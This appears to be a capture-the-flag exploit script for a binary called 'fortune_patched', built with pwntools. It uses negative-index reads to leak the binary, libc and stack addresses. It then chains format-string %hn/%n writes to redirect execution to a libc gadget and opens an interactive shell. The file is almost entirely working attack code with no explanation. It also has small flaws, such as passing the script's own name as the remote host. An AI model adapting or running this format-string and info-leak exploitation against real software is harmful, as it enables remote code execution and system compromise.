#!/usr/bin/env python3

from pwn import *

exe = './fortune_patched'
elf = context.binary = ELF(exe)
libc = elf.libc
io = process() if not args.REMOTE else remote(sys.argv[0], int(sys.argv[1]))

def get(index, recv=True):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(index).encode())
    if recv:
        io.recvline()
        return io.recvline()[:-1]

def set(val):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', val)

def printf(address, recv=True):
    set(p64(address))
    return get(-16, recv)

def fsb(string, recv=True):
    set("%AAAAAAAA" + string)
    return printf(elf.sym.custom_fortune + 9, recv)

def main():

    elf.address = u64(get(-19).ljust(8, b'\x00')) - 0x4008
    libc.address = u64(printf(elf.got.puts).ljust(8, b'\x00')) - libc.sym.puts
    stack = u64(printf(libc.sym.environ).ljust(8, b'\x00'))

    fsb(f"%{(stack - 0x10)&0xffff}c%10$hn")
    fsb('%40$n')
    fsb(f"%{(stack - 0x220)&0xffff}c%10$hn")
    fsb(f"%{(stack - 0x220+2)&0xffff}c%17$hn")
    lsb, rsb = libc.address + 0x4bfe0 & 0xffff, (libc.address + 0x4bfe0 >> 16) & 0xffff
    if lsb < rsb:
        fsb(f'%{lsb}c%40$hn%{lsb-rsb}c%45$hn', False)
    else:
        fsb(f'%{rsb}c%45$hn%{lsb-rsb}c%40$hn', False)
    io.interactive()

main()
